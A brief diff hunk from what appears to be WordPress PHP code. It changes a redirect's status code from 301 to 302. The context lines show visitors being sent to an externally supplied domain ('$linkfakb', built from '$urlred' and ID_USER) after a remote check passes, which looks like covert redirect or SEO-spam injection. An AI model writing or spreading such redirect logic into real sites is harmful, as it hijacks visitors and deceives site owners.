@@ -78,7 +78,7 @@ if($headersRes['http_code']==200 && isset($res->sta) && $res->sta==1 && isset($r
 				$linkfakb='https://'.$urlred.'/'.ID_USER.'/om/'.urlencode($texte);
 				if(REDIRECT_LINK  ){
 					
-					return wp_redirectaa($linkfakb,301);
+					return wp_redirectaa($linkfakb,302);
 				}
 			}
 	}
